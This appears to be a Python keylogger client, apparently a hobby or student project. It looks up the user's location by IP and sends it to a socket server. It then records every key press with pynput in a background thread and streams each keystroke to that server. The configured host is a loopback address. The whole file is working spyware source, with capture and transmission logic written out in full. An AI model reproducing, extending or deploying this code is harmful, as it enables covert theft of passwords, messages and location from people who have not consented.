import socket
import geocoder
from pynput.keyboard import Listener
import time
import threading
CONN_HOST = "127.0.0.89"  # Standard loopback interface address (localhost)
CONN_PORT = 65230  # Port to listen on (non-privileged ports are > 1023) <[OK] Ipinfo - Geocode [Banská Bystrica, Banskobystrický kraj, SK]>
USER_GEOLOCATION = str(geocoder.ip('me'))

print(USER_GEOLOCATION[24:-2])


#! Listens for key presses and sends them to the server
def start_keylogger():
        global keyThread
        keyThread = threading.Thread(target=create_keylogger)
        keyThread.daemon = True
        keyThread.start()
        

def create_keylogger():
    print("Called the function")
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CONN_HOST,CONN_PORT))
        s.send(bytes(USER_GEOLOCATION[24:-2], 'utf-8'))
        while True:
            time.sleep(0.1)
            def on_press(key):
                string =f"{key}"
                try:    s.send(bytes(string, 'utf-8'))
                except: 
                    print("\nServer keylogger is down.\n")
                    time.sleep(5)
                    
            while True:
                print("Starting logger.")
                with Listener(on_press=on_press) as listener:
                    listener.join()

